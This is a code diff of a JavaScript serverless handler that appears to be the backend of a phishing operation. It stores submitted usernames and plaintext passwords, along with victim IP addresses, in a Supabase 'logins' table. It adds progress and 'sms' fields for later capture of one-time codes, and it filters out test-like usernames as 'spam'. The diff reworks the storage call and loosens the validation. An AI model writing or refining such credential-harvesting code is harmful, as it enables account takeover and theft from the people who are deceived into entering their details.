@@ -1,7 +1,9 @@
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
+
 export default async function handler(req, res) {
-  // Permitir CORS
+  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
   if (req.method === 'OPTIONS') {
@@ -15,34 +17,32 @@ export default async function handler(req, res) {
   try {
     const { username, pass, id, ip } = req.body;
 
-    // Validación anti-spam
-    if (!username || !pass || username.length < 3 || pass.length < 3) {
+    // Validaciones
+    if (!username || !pass || username.length < 3) {
       return res.status(400).json({ error: 'Datos inválidos' });
     }
 
-    const spam = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass'];
+    const spam = ['test', 'prueba', 'admin', 'demo', 'fake'];
     if (spam.some(s => username.toLowerCase().includes(s))) {
       return res.status(403).json({ error: 'Spam detectado' });
     }
 
-    // Obtener variables de entorno
-    const SUPABASE_URL = process.env.SUPABASE_URL;
-    const SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
+    // Crear cliente Supabase con la nueva key (sbp_...)
+    const supabase = createClient(
+      process.env.SUPABASE_URL,
+      process.env.SUPABASE_SERVICE_ROLE_KEY,
+      {
+        auth: {
+          autoRefreshToken: false,
+          persistSession: false
+        }
+      }
+    );
 
-    if (!SUPABASE_URL || !SERVICE_KEY) {
-      return res.status(500).json({ error: 'Configuración incompleta' });
-    }
-
-    // Guardar en Supabase
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/logins`, {
-      method: 'POST',
-      headers: {
-        'apikey': SERVICE_KEY,
-        'Authorization': `Bearer ${SERVICE_KEY}`,
-        'Content-Type': 'application/json',
-        'Prefer': 'return=minimal'
-      },
-      body: JSON.stringify({
+    // Insertar usando la librería (más confiable)
+    const { error } = await supabase
+      .from('logins')
+      .insert({
         id: id || crypto.randomUUID(),
         username,
         pass,
@@ -51,19 +51,17 @@ export default async function handler(req, res) {
         step: 'Verificando...',
         sms: '----',
         created_at: new Date().toISOString()
-      })
-    });
+      });
 
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error('Supabase error:', errorText);
-      return res.status(500).json({ error: 'Error al guardar en base de datos' });
+    if (error) {
+      console.error('Supabase error:', error);
+      return res.status(500).json({ error: error.message });
     }
 
-    res.status(200).json({ success: true, message: 'Registro guardado' });
+    res.status(200).json({ success: true });
 
   } catch (error) {
     console.error('Error:', error);
-    res.status(500).json({ error: 'Error interno del servidor' });
+    res.status(500).json({ error: error.message });
   }
 }
